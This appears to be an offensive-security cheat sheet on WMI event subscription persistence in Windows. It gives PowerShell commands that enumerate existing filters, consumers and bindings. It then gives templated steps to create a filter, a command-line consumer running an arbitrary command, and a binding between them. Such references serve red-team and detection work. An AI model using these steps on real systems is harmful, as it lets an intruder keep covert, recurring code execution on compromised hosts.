---
technique: WMI Event Subscription Persistence
category: persistence
targets: Windows WMI
protocols: Local, WMI
remote_capable: false
tags: windows persistence wmi event-subscription
---

# WMI Event Subscription Persistence

WMI event subscription persistence binds an event filter to a consumer so Windows runs a command when the filter condition is met.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| WMI write access | Creating permanent subscriptions requires elevated WMI rights |
| Trigger condition | The event query must trigger under normal host activity |
| Consumer command | The consumer action must point to the desired command |

## Windows

### List event filters

#powershell #wmi #persistence

List WMI event filters.

```powershell title:"List WMI event filters"
Get-WmiObject -Namespace root\subscription -Class __EventFilter
```
<!-- cheat -->

### List command consumers

#powershell #wmi #persistence

List WMI command-line event consumers.

```powershell title:"List WMI command consumers"
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
```
<!-- cheat -->

### List filter bindings

#powershell #wmi #persistence

List WMI filter-to-consumer bindings.

```powershell title:"List WMI filter consumer bindings"
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```
<!-- cheat -->

### Step 1: Create event filter

#powershell #wmi #persistence

Create a prepared WMI event filter.

```powershell title:"Create WMI event filter"
Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name="$filter_name"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="$wql_query"}
```
<!-- cheat
var filter_name
var wql_query
-->

### Step 2: Create command consumer

#powershell #wmi #persistence

Create a command-line event consumer.

```powershell title:"Create WMI command consumer"
Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name="$consumer_name"; CommandLineTemplate="$command"}
```
<!-- cheat
var consumer_name
var command
-->

### Step 3: Bind filter to consumer

#powershell #wmi #persistence

Bind the event filter to the command consumer.

```powershell title:"Bind WMI filter to consumer"
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter="__EventFilter.Name='$filter_name'"; Consumer="CommandLineEventConsumer.Name='$consumer_name'"}
```
<!-- cheat
var filter_name
var consumer_name
-->

## Linux

No Linux operator command is included here. This note covers Windows WMI persistence.
